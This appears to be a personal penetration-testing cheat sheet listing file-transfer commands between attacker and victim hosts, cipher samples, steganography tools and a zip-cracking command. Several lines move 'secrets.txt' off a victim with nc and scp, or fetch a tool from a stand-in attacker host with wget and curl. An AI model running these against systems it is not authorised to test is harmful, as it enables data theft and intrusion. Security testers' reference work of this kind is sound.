# PenTestCheatSheet

Commands, tools, and tricks I have found useful in the past. Maybe you'll find something useful too. Not a definitive guide, more like a brain dump.

## Uploading and downloading files

### Servers

`python3 -m http.server` works on port 8000 by default, can specify with port number at end if desired  
`smbserver.py myshare .` serves current directory's files over SMB share "myshare"  
`nc -lvp 8080 < secrets.txt` nc server for transferring files  
`scp secrets.txt lus3r@v1ct1m:/` scp upload file to remote home directory

### Clients

`wget http://4tt4ck3r:8000/l33t_h4ck` and `curl -O http://4tt4ck3r:8000/l33t_h4ck`   
(various powershell downloaders TODO)  
(net use/copy)  
`nc v1ct1m 8080 > secrets.txt` nc client for transferring files  
`scp lus3r@v1ct1m:/secrets.txt ./` scp download file to current local directory  


## Ciphers

Base64: aGl5YQ== (notice the telltale double equals signs)  
Rot47: *@F DA:? >6 C:89E C@F?5 323J C:89E C@F?5 Wcf E:>6DX

## Steganography

https://futureboy.us/stegano/decinput.html JPEG, WAV, AU (seems to work for steghide)  
`steghide`  
DIIT  
S-tools?  
Stegsolver  

## Cracking
`fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt crackme.zip` weird syntax in my opinion
